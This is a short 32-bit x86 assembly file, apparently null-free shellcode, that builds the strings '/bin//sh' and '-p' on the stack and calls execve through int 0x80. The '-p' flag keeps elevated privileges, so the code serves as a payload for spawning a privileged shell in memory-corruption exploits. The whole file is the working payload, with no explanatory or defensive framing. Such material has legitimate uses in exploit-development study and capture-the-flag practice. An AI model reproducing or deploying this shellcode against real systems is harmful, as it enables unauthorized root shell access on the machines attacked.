.code32
.globl _start
.section .text

_start:
	#movl	$0xcccccccc, %eax
	#movl	$0xcccccccc, %ebx
	#movl	$0xcccccccc, %ecx
	#movl	$0xcccccccc, %edx
	#movl	$0xcccccccc, %esi
	#movl	$0xcccccccc, %edi
	#movl	$0xcccccccc, %ebp

	pushl	$11
	popl	%eax				# eax = 11
	cltd						# edx = 0
	pushl	%edx				# null character
	pushl	$0x68732f2f			# //sh
	pushl	$0x6e69622f			# /bin
	movl	%esp, %ebx			# ebx(argv[0]) = "/bin//sh"
	pushl	%edx				# null character
	pushw	$0x702d				# -p
	movl	%esp, %ecx			# ecx = "-p"
	pushl	%edx				# null pointer
	movl	%esp, %edx			# edx(envp) = {NULL}
	pushl	%ecx				# "-p"
	pushl	%ebx				# "/bin//sh"
	movl	%esp, %ecx			# ecx(argv) = {"/bin//sh", "-p", NULL}
	int		$0x80				# execve("/bin//sh", ["/bin//sh", "-p", NULL], [NULL])
